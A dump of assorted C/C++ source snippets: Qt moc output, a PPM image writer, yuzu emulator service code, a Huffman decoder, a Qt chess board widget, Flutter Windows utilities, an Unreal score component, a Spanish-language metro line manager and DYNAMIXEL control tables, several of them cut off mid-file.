QT_MOC_LITERAL(ofs, len) \\\n    uint(offsetof(qt_meta_stringdata_KiemTra_t, stringdata0) + ofs), len \nstatic const qt_meta_stringdata_KiemTra_t qt_meta_stringdata_KiemTra = {\n    {\nQT_MOC_LITERAL(0, 7), // \"KiemTra\"\nQT_MOC_LITERAL(8, 12), // \"nhanDu10Byte\"\nQT_MOC_LITERAL(21, 0), // \"\"\nQT_MOC_LITERAL(22, 11) // \"indicateLed\"\n\n    },\n    \"KiemTra\\0nhanDu10Byte\\0\\0indicateLed\"\n};\n#undef QT_MOC_LITERAL\n\nstatic const uint qt_meta_data_KiemTra[] = {\n\n // content:\n      10,       // revision\n       0,       // classname\n       0,    0, // classinfo\n       2,   14, // methods\n       0,    0, // properties\n       0,    0, // enums/sets\n       0,    0, // constructors\n       0,       // flags\n       1,       // signalCount\n\n // signals: name, argc, parameters, tag, flags, initial metatype offsets\n       1,    0,   26,    2, 0x06,    1 /* Public */,\n\n // slots: name, argc, parameters, tag, flags, initial metatype offsets\n       3,    0,   27,    2, 0x0a,    2 /* Public */,\n\n // signals: parameters\n    QMetaType::Void,\n\n // slots: parameters\n    QMetaType::Void,\n\n       0        // eod\n};\n\nvoid KiemTra::qt_static_metacall(QObject *_o, QMetaObject::Call _c, int _id, void **_a)\n{\n    if (_c == QMetaObject::InvokeMetaMethod) {\n        auto *_t = static_cast<KiemTra *>(_o);\n        (void)_t;\n        switch (_id) {\n        case 0: _t->nhanDu10Byte(); break;\n        case 1: _t->indicateLed(); break;\n        default: ;\n        }\n    } else if (_c == QMetaObject::IndexOfMethod) {\n        int *result = reinterpret_cast<int *>(_a[0]);\n        {\n            using _t = void (KiemTra::*)();\n            if (*reinterpret_cast<_t *>(_a[1]) == static_cast<_t>(&KiemTra::nhanDu10Byte)) {\n                *result = 0;\n                return;\n            }\n        }\n    }\n    (void)_a;\n}\n\nconst QMetaObject KiemTra::staticMetaObject = { {\n    QMetaObject::SuperData::link<QWidget::staticMetaObject>(),\n    qt_meta_stringdata_KiemTra.offsetsAndSize,\n    qt_meta_data_KiemTra,\n    qt_static_metacall,\n    nullptr,\nqt_incomplete_metaTypeArray<qt_meta_stringdata_KiemTra_t\n, QtPrivate::TypeAndForceComplete<KiemTra, std::true_type>, QtPrivate::TypeAndForceComplete<void, std::false_type>\n, QtPrivate::TypeAndForceComplete<void, std::false_type>\n\n\n>,\n    nullptr\n} };\n\n\nconst QMetaObject *KiemTra::metaObject() const\n{\n    return QObject::d_ptr->metaObject ? QObject::d_ptr->dynamicMetaObject() : &staticMetaObject;\n}\n\nvoid *KiemTra::qt_metacast(const char *_clname)\n{\n    if (!_clname) return nullptr;\n    if (!strcmp(_clname, qt_meta_stringdata_KiemTra.stringdata0))\n        return static_cast<void*>(this);\n    return QWidget::qt_metacast(_clname);\n}\n\nint KiemTra::qt_metacall(QMetaObject::Call _c, int _id, void **_a)\n{\n    _id = QWidget::qt_metacall(_c, _id, _a);\n    if (_id < 0)\n        return _id;\n    if (_c == QMetaObject::InvokeMetaMethod) {\n        if (_id < 2)\n            qt_static_metacall(this, _c, _id, _a);\n        _id -= 2;\n    } else if (_c == QMetaObject::RegisterMethodArgumentMetaType) {\n        if (_id < 2)\n            *reinterpret_cast<QMetaType *>(_a[0]) = QMetaType();\n        _id -= 2;\n    }\n    return _id;\n}\n\n// SIGNAL 0\nvoid KiemTra::nhanDu10Byte()\n{\n    QMetaObject::activate(this, &staticMetaObject, 0, nullptr);\n}\nQT_WARNING_POP\nQT_END_MOC_NAMESPACE\n",
    "#include <iostream>\n#include <fstream> \n\nint main() {\n\n    // Image\n\n    int image_width = 256;\n    int image_height = 256;\n\n    // Open file for writing\n    std::ofstream outfile(\"image.ppm\");\n\n    // Render\n    outfile << \"P3\\n\" << image_width << ' ' << image_height << \"\\n255\\n\";\n\n    for (int j = 0; j < image_height; ++j) {\n        for (int i = 0; i < image_width; ++i) {\n            outfile << (i * 255 / (image_width - 1)) << ' ' \n                    << (j * 255 / (image_height - 1)) << \" 0\\n\";\n        }\n    }\n\n    // Close the file\n    outfile.close();\n\n    std::clog << \"\\rDone.                 \\n\";\n}\n\n// The pixels are written out in rows.\n\n// Every row of pixels is written out left to right.\n\n// These rows are written out from top to bottom.\n\n//By convention, each of the red/green/blue components are represented internally by real-valued variables that range \n//from 0.0 to 1.0. These must be scaled to integer values between 0 and 255 before we print them out.\n\n//Red goes from fully off (black) to fully on (bright red) from left to right, and green goes from fully off at the top (black) \n//to fully on at the bottom (bright green). Adding red and green light together make yellow so we should expect the bottom right \n//corner to be yellow.",
    "// SPDX-FileCopyrightText: Copyright 2018 yuzu Emulator Project\n// SPDX-License-Identifier: GPL-2.0-or-later\n\n#include \"core/hle/service/cmif_serialization.h\"\n#include \"core/hle/service/vi/application_display_service.h\"\n#include \"core/hle/service/vi/application_root_service.h\"\n#include \"core/hle/service/vi/container.h\"\n#include \"core/hle/service/vi/service_creator.h\"\n#include \"core/hle/service/vi/vi.h\"\n#include \"core/hle/service/vi/vi_types.h\"\n\nnamespace Service::VI {\n\nIApplicationRootService::IApplicationRootService(Core::System& system_,\n                                                 std::shared_ptr<Container> container)\n    : ServiceFramework{system_, \"vi:u\"}, m_container{std::move(container)} {\n    static const FunctionInfo functions[] = {\n        {0, C<&IApplicationRootService::GetDisplayService>, \"GetDisplayService\"},\n        {1, nullptr, \"GetDisplayServiceWithProxyNameExchange\"},\n    };\n    RegisterHandlers(functions);\n}\n\nIApplicationRootService::~IApplicationRootService() = default;\n\nResult IApplicationRootService::GetDisplayService(\n    Out<SharedPointer<IApplicationDisplayService>> out_application_display_service, Policy policy) {\n    LOG_DEBUG(Service_VI, \"called\");\n    R_RETURN(GetApplicationDisplayService(out_application_display_service, system, m_container,\n                                          Permission::User, policy));\n}\n\n} // namespace Service::VI\n",
    "#include <iostream>\n#include <vector>\n#include <unordered_map>\n#include <bitset>\n#include <algorithm>\n#include <fstream>\n#include <string>\n#include <queue>\n#include <iomanip>\n#include \"kaitai/kaitaistream.h\"\n#include \"column_data_dictionary.h\"\n\n// Huffman Tree Node definition\nstruct HuffmanTree {\n    uint8_t c;\n    HuffmanTree* left;\n    HuffmanTree* right;\n\n    HuffmanTree(uint8_t c = 0) : c(c), left(nullptr), right(nullptr) {}\n    ~HuffmanTree() {\n        delete left;\n        delete right;\n    }\n};\n\nstd::string iso88591_to_utf8(uint8_t code) {\n    std::string utf8;\n    if (code >= 0x80) {\n        utf8.push_back(static_cast<char>(0xC2 + (code > 0xBF)));\n        utf8.push_back(static_cast<char>((code & 0x3F) + 0x80));\n    } else {\n        utf8.push_back(static_cast<char>(code));\n    }\n    return utf8;\n}\n// Function to generate the full 256-byte Huffman array from the compact 128-byte encode_array\nstd::vector<uint8_t> decompress_encode_array(const std::vector<uint8_t>& compressed) {\n    std::vector<uint8_t> full_array(256, 0);\n\n    for (size_t i = 0; i < compressed.size(); i++) {\n        uint8_t byte = compressed[i];\n        full_array[2 * i] = byte & 0x0F;         // Lower nibble\n        full_array[2 * i + 1] = (byte >> 4) & 0x0F; // Upper nibble\n    }\n\n    return full_array;\n}\n\n// Function to generate Huffman codes based on codeword lengths\nstd::unordered_map<uint8_t, std::string> generate_codes(const std::vector<uint8_t>& lengths) {\n    std::unordered_map<uint8_t, std::string> codes;\n    std::vector<std::pair<uint8_t, uint8_t>> sorted_lengths;\n\n    // Collect only the non-zero lengths and their associated symbols\n    for (auto i = 0; i < 256; i++) {\n        if (lengths[i] != 0){\n            sorted_lengths.emplace_back(lengths[i], i);\n        }\n    }\n    // Sort by length first, then by character\n    std::sort(sorted_lengths.begin(), sorted_lengths.end(), [](const auto& a, const auto& b) {\n        return a.first != b.first ? a.first < b.first : a.second < b.second;\n    });\n\n    int code = 0;\n    int last_length = 0;\n\n    for (const auto& [length, character] : sorted_lengths) {\n        if (last_length != length) {\n            code <<= (length - last_length); // Shift code by difference in lengths\n            last_length = length;\n        }\n\n        // Generate the code string representation up to 15 bits\n        codes[character] = std::bitset<15>(code).to_string().substr(15 - length);\n        code++;\n    }\n\n    return codes;\n}\n\n// Print Huffman codes\nvoid print_huffman_codes(const std::unordered_map<uint8_t, std::string>& codes) {\n    std::cout << \"Huffman Codes:\\n\";\n    for (const auto& [character, code] : codes) {\n        std::cout << (int)character <<\" - \" << character << \": \" << code << '\\n';\n        }\n}\n\n// Build Huffman tree based on generated codes\nHuffmanTree* build_huffman_tree(const std::vector<uint8_t>& encode_array) {\n    auto codes = generate_codes(encode_array);\n// print_huffman_codes(codes);\n    HuffmanTree* root = new HuffmanTree;\n\n    for (const auto& [character, code] : codes) {\n        HuffmanTree* node = root;\n        for (char bit : code) {\n            if (bit == '0') {\n                if (!node->left) node->left = new HuffmanTree;\n                node = node->left;\n            } else {\n                if (!node->right) node->right = new HuffmanTree;\n                node = node->right;\n            }\n        }\n        node->c = character;\n    }\n\n    return root;\n}\n// Decode a bitstream from start to end bit positions using the Huffman tree\nstd::string decode_substring(const std::string& bitstream, HuffmanTree* tree, uint32_t start_bit, uint32_t end_bit) {\n    std::string result;\n    const HuffmanTree* node = tree;\n    uint32_t total_bits = end_bit - start_bit;\n\n    // Adjust bit position calculation for little endian byte order\n    for (uint32_t i = 0; i < total_bits; ++i) {\n        uint32_t bit_pos = start_bit + i;\n        uint32_t byte_pos = bit_pos / 8;\n        uint32_t bit_offset = bit_pos % 8;\n\n        // Convert byte index for little endian (pair-wise)\n        byte_pos = (byte_pos & ~0x01) + (1 - (byte_pos & 0x01));\n\n        if (!node->left && !node->right) {\n            result += iso88591_to_utf8(node->c);\n            node = tree; // Reset to the root node\n        }\n\n        // Traverse the Huffman tree based on the current bit\n        if (bitstream[byte_pos] & (1 << (7 - bit_offset))) {  // Adjusting bit offset to read from MSB to LSB\n            node = node->right;\n        } else {\n            node = node->left;\n        }\n    }\n\n    // Append the last character if the final node is a leaf\n    if (!node->left && !node->right) {\n        result += iso88591_to_utf8(node->c);\n    }\n\n    return result;\n}\n\n\n// Print Huffman tree in a readable format\nvoid print_huffman_tree(HuffmanTree* node, int indent = 0) {\n    if (node == nullptr) return;\n\n    if (node->right) print_huffman_tree(node->right, indent + 4);\n\n    if (indent) std::cout << std::setw(indent) << ' ';\n    if (!node->left && ",
    "#include \"widget.h\"\n#include \"./ui_widget.h\"\n#include \"ui_inputfen.h\"\n\nWidget::Widget(QWidget *parent)\n    : QWidget(parent)\n    , ui(new Ui::Widget)\n{\n    setFocusPolicy(Qt::StrongFocus);\n    ui->setupUi(this);\n    InitProgram();\n    InitWindow();\n}\n\nWidget::~Widget()\n{\n    delete ui;\n}\n\nvoid Widget::paintEvent(QPaintEvent* event){\n    {\n        ui->Output_PGN->setEnabled(false);\n    }\n    if(Options::LightColorMode){\n        ui->TurnLabel->setStyleSheet(\"color:#0f0f0f;\");\n    }\n    else{\n        ui->TurnLabel->setStyleSheet(\"color:#f0f0f0;\");\n        QPainter p(this);\n        QPen pen;\n        QBrush brush;\n        QColor color;\n        color.setRgb(15, 15, 15);\n        pen.setColor(color);\n        brush.setColor(color);\n        brush.setStyle(Qt::SolidPattern);\n        p.setPen(pen);\n        p.setBrush(brush);\n        p.drawRect(rect());\n    }\n    if(InGame){\n        switch (game->turn){\n            case White:\n                ui->TurnLabel->setText(\"\u767d\u65b9\u56de\u5408\");\n                break;\n            case Black:\n                ui->TurnLabel->setText(\"\u9ed1\u65b9\u56de\u5408\");\n                break;\n            default:\n                break;\n        }\n    }\n    QPainter painter(this);\n    painter.setRenderHint(QPainter::Antialiasing);\n    QPixmap Board, InCheck, BoardBlock[8][8], BoardChess[8][8];\n    Board.load(IMG_BOARD);\n    InCheck.load(IMG_CHECK);\n    painter.drawPixmap(60, 40, 640, 640, Board);\n    if(HoldingChess){\n        for(short ROW=0; ROW<8; ROW++){\n            for(short COL=0; COL<8; COL++){\n                if(ROW==OldRow && COL==OldCol){\n                    if((ROW+COL)%2){\n                        BoardBlock[ROW][COL].load(IMG_VALID_BLOCK);\n                    }\n                    else{\n                        BoardBlock[ROW][COL].load(IMG_VALID_BLOCK2);\n                    }\n                    painter.drawPixmap(60+COL*80, 600-ROW*80, 80, 80, BoardBlock[ROW][COL]);\n                    continue;\n                }\n                for(short s=0; ; s++){\n                    if(valid[s][0]==-1){\n                        break;\n                    }\n                    if((ROW==valid[s][0] && COL==valid[s][1])){\n                        if(game->chess[ROW][COL]->p==Neutral){\n                            BoardBlock[ROW][COL].load(IMG_VALID_POINT);\n                            painter.drawPixmap(60+COL*80, 600-ROW*80, 80, 80, BoardBlock[ROW][COL]);\n                        }\n                        else{\n                            if((ROW+COL)%2){\n                                BoardBlock[ROW][COL].load(IMG_VALID_BLOCK);\n                            }\n                            else{\n                                BoardBlock[ROW][COL].load(IMG_VALID_BLOCK2);\n                            }\n                            painter.drawPixmap(60+COL*80, 600-ROW*80, 80, 80, BoardBlock[ROW][COL]);\n                        }\n                    }\n                }\n            }\n        }\n    }\n    if(game->turn==Neutral){\n        if(!Empty){\n            painter.drawPixmap(KingX, KingY, 80, 80, InCheck);\n        }\n    }\n    else{\n        short* KingPos = game->FindKing(game->turn);\n        if(KingPos != nullptr && game->KingInCheck(game->turn, KingPos[0], KingPos[1])){\n            KingX = 60+KingPos[1]*80;\n            KingY = 600-KingPos[0]*80;\n            painter.drawPixmap(KingX, KingY, 80, 80, InCheck);\n        }\n        IsCheckmate();\n    }\n    for(short ROW=0; ROW<8; ROW++){\n        for(short COL=0; COL<8; COL++){\n            if(game->chess[ROW][COL]->Type()!=Null){\n                if(game->chess[ROW][COL]->p==White){\n                    switch (game->chess[ROW][COL]->Type()){\n                        case King:\n                            BoardChess[ROW][COL].load(IMG_WHITE_KING);\n                            break;\n                        case Queen:\n                            BoardChess[ROW][COL].load(IMG_WHITE_QUEEN);\n                            break;\n                        case Bishop:\n                            BoardChess[ROW][COL].load(IMG_WHITE_BISHOP);\n                            break;\n                        case kNight:\n                            BoardChess[ROW][COL].load(IMG_WHITE_KNIGHT);\n                            break;\n                        case Rook:\n                            BoardChess[ROW][COL].load(IMG_WHITE_ROOK);\n                            break;\n                        case Pawn:\n                            BoardChess[ROW][COL].load(IMG_WHITE_PAWN);\n                            break;\n                        default:\n                            break;\n                    }\n                }\n                else{\n                    switch (game->chess[ROW][COL]->Type()){\n                        case King:\n                            BoardChess[ROW][COL].load(IMG_BLACK_KING);\n                            break;\n                        case Queen:\n                            BoardChess[ROW][COL].load(IMG_BLACK_QUEEN);\n                            break;\n                        case Bishop:\n             ",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "// Fill out your copyright notice in the Description page of Project Settings.\r\n\r\n\r\n#include \"Gameplay/Score/ScoreComponent.h\"\r\n#include \"Kismet/GameplayStatics.h\"\r\n#include \"Gameplay/Goal/Goal.h\"\r\n\r\nUScoreComponent::UScoreComponent()\r\n{\r\n\tPrimaryComponentTick.bCanEverTick = false;\r\n}\r\n\r\nvoid UScoreComponent::BeginPlay()\r\n{\r\n\tSuper::BeginPlay();\r\n\r\n\t// Exercice 3\r\n\t// Bind function to each goal\r\n\tUGameplayStatics::GetAllActorsOfClass(GetWorld(), AGoal::StaticClass(), GoalArray);\r\n\tfor (AActor* Goal : GoalArray)\r\n\t{\r\n\t\tAGoal* GoalCasted = Cast<AGoal>(Goal);\r\n\t\tif (GoalCasted)\r\n\t\t{\r\n\t\t\tGoalCasted->OnSendGoal.AddUniqueDynamic(this, &UScoreComponent::OnRecieveScore);\r\n\r\n\t\t\t// Exercice 4\r\n\t\t\tGoalCasted->OnSendTeamGoaled.AddUniqueDynamic(this, &UScoreComponent::RecieveGoalTeam);\r\n\t\t}\r\n\t}\r\n\r\n\t// Exercice 4\r\n\t// Make team static array\r\n\tfor (const FTeamStruct& TeamStruct : TeamArray)\r\n\t{\r\n\t\tTeamStaticArray[(uint8)TeamStruct.Team] = TeamStruct;\r\n\t}\r\n}\r\n\r\nvoid UScoreComponent::OnRecieveScore(unsigned int Score)\r\n{\r\n\tUE_LOG(LogTemp, Log, TEXT(\"SCORE RECIEVED IS % d\"), Score);\r\n}\r\n\r\nvoid UScoreComponent::RecieveGoalTeam(ETeamEnum TeamGoaled)\r\n{\r\n\tif (TeamGoaled != ETeamEnum::None)\r\n\t{\r\n\t\tTeamStaticArray[(uint8)TeamGoaled].Score++;\r\n\t}\r\n}\r\n\r\nvoid UScoreComponent::DisplayScore()\r\n{\r\n\tfor (const FTeamStruct& TeamStruct : TeamStaticArray)\r\n\t{\r\n\t\tif (TeamStruct.Team != ETeamEnum::None)\r\n\t\t{\r\n\t\t\tFString EnumName;\r\n\t\t\tUEnum::GetValueAsString(TeamStruct.Team, EnumName);\r\n\t\t\tUE_LOG(LogTemp, Log, TEXT(\"TEAM %s HAS TAKEN %d GOAL\"), *EnumName, TeamStruct.Score);\r\n\t\t}\r\n\t}\r\n}\r\n",
    "#include \"linea.h\"\n#include \"estacion.h\"\n#include <iostream>\n#include <string>\nint indice = 0;\n\nestacion linea::agregarEstacionC(int e,int a){\n    string nombreEstacin;\n    int tiempoSigEstacion=0;\n    bool esTransferencia=false;\n\n    cout << \"Ingrese el nombre de la estacion \" << e + 1 << \": \";\n    cin >> nombreEstacin;\n    if(e==a){\n        tiempoSigEstacion = 0;\n    }else{\n        cout << \"Ingrese el tiempo hacia la siguiente estacion \" << e + 1 << \": \";\n        cin >> tiempoSigEstacion;\n    }\n    cout << \"Es esta una estacion de transferencia? (1 para si, 0 para no): \";\n    cin >> esTransferencia;\n\n    return estacion(e, nombreEstacin, tiempoSigEstacion, esTransferencia);\n}\n\nvoid linea::agregarEstacion(estacion* nuevaEstacion) {\n    // Primero, encontramos un espacio disponible en el arreglo de estaciones\n    int indice = 0;\n    while (indice < numestacions && estacions[indice] != nullptr) {\n        indice++;\n    }\n\n    numestacions++;\n\n    // Si encontramos un espacio disponible, agregamos la nueva estaci\u00f3n\n    if (indice < numestacions+1) {\n        estacions[indice] = nuevaEstacion;\n        cout << \"Estacion agregada correctamente a la linea.\" << endl;\n    } else {\n        cout << \"No hay espacio disponible para agregar mas estaciones a la linea.\" << endl;\n        delete nuevaEstacion; // Liberamos la memoria si no hay espacio disponible\n    }\n}\n\n\nvoid linea::editarNomLinea() {\n    string nuevoNombre;\n    cout << \"Ingrese el nuevo nombre para la linea: \";\n    cin >> nuevoNombre;\n    nomLinea = nuevoNombre;\n    cout << \"Nombre de linea actualizado correctamente.\" << endl;\n}\n\nint linea::cantidadEstacionsLinea()  {\n    int contadorEstaciones = 0;\n    for (int i = 0; i < numestacions; ++i) {\n        if (estacions[i] != nullptr) {\n            contadorEstaciones++;\n        }\n    }\n    return contadorEstaciones;\n}\n\n\nint linea::calcularTiempo(int indiceEstacion1, int indiceEstacion2) {\n    if (indiceEstacion1 < 0 || indiceEstacion1 >= numestacions || indiceEstacion2 < 0 || indiceEstacion2 >= numestacions) {\n        cout << \"Los \u00edndices de estaciones proporcionados son inv\u00e1lidos.\" << endl;\n        return -1; // Valor de retorno indicando error\n    }\n\n    int distanciaTotal = 0;\n    int indiceInicio = min(indiceEstacion1, indiceEstacion2);\n    int indiceFin = max(indiceEstacion1, indiceEstacion2);\n\n    for (int i = indiceInicio; i < indiceFin; ++i) {\n        if (estacions[i] != nullptr && estacions[i + 1] != nullptr) {\n            distanciaTotal += estacions[i]->getTiempoSigEstacion();\n        } else {\n            cout << \"Una o ambas estaciones seleccionadas no tienen tiempo hacia la siguiente estaci\u00f3n.\" << endl;\n            return -1; // Valor de retorno indicando error\n        }\n    }\n\n    return distanciaTotal;\n}\n\nint linea::mostrarEstacionesYSeleccionar(){\n    cout << \"Lista de estaciones en la linea \" << nomLinea << \":\" << endl;\n    for (int i = 0; i < numestacions; ++i) {\n        if (estacions[i] != nullptr) {\n            cout << i + 1 << \". \" << estacions[i]->getnomEstacion() << endl;\n        }\n    }\n    int seleccion;\n    do {\n        cout << \"Seleccione el numero de la estacion que desea: \";\n        cin >> seleccion;\n    } while (seleccion < 1 || seleccion > numestacions || estacions[seleccion - 1] == nullptr);\n\n    // Aqu\u00ed puedes hacer lo que necesites con la estaci\u00f3n seleccionada\n    cout << \"Ha seleccionado la estacion: \" << estacions[seleccion - 1]->getnomEstacion() << endl;\n    return seleccion-1;\n}\n\nvoid linea::eliminarEstacion(int seleccion){\n    if (seleccion >= 0 && seleccion < numestacions && estacions[seleccion] != nullptr) {\n        if (estacions[seleccion]->getEsTransferencia() == false) {\n            delete estacions[seleccion];\n            estacions[seleccion] = nullptr;\n            cout << \"Estacion eliminada correctamente de la linea.\" << endl;\n        } else {\n            cout << \"No se puede eliminar la estacion de transferencia.\" << endl;\n        }\n    } else {\n        cout << \"No se puede eliminar la estacion. \u00cdndice invalido o estacion inexistente.\" << endl;\n    }\n}\n\nvoid linea::editarNombreEstacion(int seleccion, string nuevoNombre) {\n    if (seleccion >= 0 && seleccion < numestacions && estacions[seleccion] != nullptr) {\n        estacions[seleccion]->setnomEstacion(nuevoNombre);\n        cout << \"Nombre de la estaci\u00f3n editado correctamente.\" << endl;\n    } else {\n        cout << \"No se puede editar el nombre de la estaci\u00f3n. \u00cdndice inv\u00e1lido o estaci\u00f3n inexistente.\" << endl;\n    }\n}\n\nvoid linea::listaEstacion(){\n    int i = 0;\n    cout << \"Lista de estaciones en la linea \" << nomLinea << \":\" << endl;\n    for (i ; i < numestacions; ++i) {\n       if (estacions[i] != nullptr) {\n           cout << i + 1 << \". \" << estacions[i]->getnomEstacion() << endl;\n       }\n    }\n    cout<<\"Con un total de \"<<i<<\" estaciones\"<<endl;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "\n#include \"actuator.h\"\n#include <memory.h>\n\n#include \"arduino_droppings.h\"\n\n\nusing namespace DYNAMIXEL;\n\ntypedef struct ModelControlTableInfo{\n  uint8_t index;\n  uint16_t addr;\n  uint8_t addr_length;\n} ModelControlTableInfo_t;\n\nconst ModelControlTableInfo_t control_table_1_0[] PROGMEM = {\n#if (ENABLE_ACTUATOR_AX \\\n || ENABLE_ACTUATOR_DX \\\n || ENABLE_ACTUATOR_RX \\\n || ENABLE_ACTUATOR_EX)\n  {ControlTableItem::MODEL_NUMBER,           0, 2},\n  {ControlTableItem::FIRMWARE_VERSION,       2, 1},\n  {ControlTableItem::ID,                     3, 1},\n  {ControlTableItem::BAUD_RATE,              4, 1},\n  {ControlTableItem::RETURN_DELAY_TIME,      5, 1},\n  {ControlTableItem::CW_ANGLE_LIMIT,         6, 2},\n  {ControlTableItem::CCW_ANGLE_LIMIT,        8, 2},\n  {ControlTableItem::TEMPERATURE_LIMIT,     11, 1},\n  {ControlTableItem::MIN_VOLTAGE_LIMIT,     12, 1},\n  {ControlTableItem::MAX_VOLTAGE_LIMIT,     13, 1},\n  {ControlTableItem::MAX_TORQUE,            14, 2},\n  {ControlTableItem::STATUS_RETURN_LEVEL,   16, 1},\n  {ControlTableItem::ALARM_LED,             17, 1},\n  {ControlTableItem::SHUTDOWN,              18, 1},\n\n  {ControlTableItem::TORQUE_ENABLE,         24, 1},\n  {ControlTableItem::LED,                   25, 1},\n  {ControlTableItem::CW_COMPLIANCE_MARGIN,  26, 1},\n  {ControlTableItem::CCW_COMPLIANCE_MARGIN, 27, 1},\n  {ControlTableItem::CW_COMPLIANCE_SLOPE,   28, 1},\n  {ControlTableItem::CCW_COMPLIANCE_SLOPE,  29, 1},\n  {ControlTableItem::GOAL_POSITION,         30, 2},\n  {ControlTableItem::MOVING_SPEED,          32, 2},\n  {ControlTableItem::TORQUE_LIMIT,          34, 2},\n  {ControlTableItem::PRESENT_POSITION,      36, 2},  \n  {ControlTableItem::PRESENT_SPEED,         38, 2},\n  {ControlTableItem::PRESENT_LOAD,          40, 2},\n  {ControlTableItem::PRESENT_VOLTAGE,       42, 1},\n  {ControlTableItem::PRESENT_TEMPERATURE,   43, 1},\n  {ControlTableItem::REGISTERED,            44, 1},\n  {ControlTableItem::MOVING,                46, 1},    \n  {ControlTableItem::LOCK,                  47, 1},\n  {ControlTableItem::PUNCH,                 48, 2},\n#endif\n  {ControlTableItem::LAST_DUMMY_ITEM,        0, 0}\n};\n\nconst ModelControlTableInfo_t ex_control_table[] PROGMEM = {\n#if (ENABLE_ACTUATOR_EX)\n  {ControlTableItem::DRIVE_MODE,            10, 1},\n  {ControlTableItem::SENSED_CURRENT,        56, 2},\n#endif\n  {ControlTableItem::LAST_DUMMY_ITEM,        0, 0}\n};\n\nconst ModelControlTableInfo_t control_table_1_1[] PROGMEM = {\n#if (ENABLE_ACTUATOR_MX12W \\\n || ENABLE_ACTUATOR_MX28 \\\n || ENABLE_ACTUATOR_MX64 \\\n || ENABLE_ACTUATOR_MX106)\n  {ControlTableItem::MODEL_NUMBER,           0, 2},\n  {ControlTableItem::FIRMWARE_VERSION,       2, 1},\n  {ControlTableItem::ID,                     3, 1},\n  {ControlTableItem::BAUD_RATE,              4, 1},\n  {ControlTableItem::RETURN_DELAY_TIME,      5, 1},\n  {ControlTableItem::CW_ANGLE_LIMIT,         6, 2},\n  {ControlTableItem::CCW_ANGLE_LIMIT,        8, 2},\n  {ControlTableItem::TEMPERATURE_LIMIT,     11, 1},\n  {ControlTableItem::MIN_VOLTAGE_LIMIT,     12, 1},\n  {ControlTableItem::MAX_VOLTAGE_LIMIT,     13, 1},\n  {ControlTableItem::MAX_TORQUE,            14, 2},\n  {ControlTableItem::STATUS_RETURN_LEVEL,   16, 1},\n  {ControlTableItem::ALARM_LED,             17, 1},\n  {ControlTableItem::SHUTDOWN,              18, 1},\n  {ControlTableItem::MULTI_TURN_OFFSET,     20, 2},\n  {ControlTableItem::RESOLUTION_DIVIDER,    22, 1},\n\n  {ControlTableItem::TORQUE_ENABLE,         24, 1},\n  {ControlTableItem::LED,                   25, 1},\n  {ControlTableItem::D_GAIN,                26, 1},\n  {ControlTableItem::I_GAIN,                27, 1},\n  {ControlTableItem::P_GAIN,                28, 1},\n  {ControlTableItem::GOAL_POSITION,         30, 2},\n  {ControlTableItem::MOVING_SPEED,          32, 2},\n  {ControlTableItem::TORQUE_LIMIT,          34, 2},\n  {ControlTableItem::PRESENT_POSITION,      36, 2},  \n  